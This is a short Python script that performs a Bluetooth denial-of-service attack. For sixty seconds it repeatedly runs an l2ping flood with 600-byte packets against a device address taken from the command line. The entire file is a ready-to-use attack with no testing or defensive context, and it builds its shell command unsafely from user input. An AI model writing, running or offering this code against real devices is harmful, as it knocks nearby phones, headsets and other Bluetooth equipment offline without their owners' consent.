import subprocess
import sys
import time

def perform_dos_attack(target_address, packet_size):
    cmd = f"l2ping -i hci0 -s {packet_size} -f {target_address}"
    start_time = time.time()
    while time.time() - start_time < 60:
        try:
            subprocess.run(cmd, shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[+] Sending packet to {target_address}. Packet size: {packet_size}.")
            time.sleep(0.2)
        except KeyboardInterrupt:
            print("\nDoS attack stopped.")
            break

if __name__ == "__main__":
    
    target_address = sys.argv[1]
    packet_size = 600
    perform_dos_attack(target_address, packet_size)

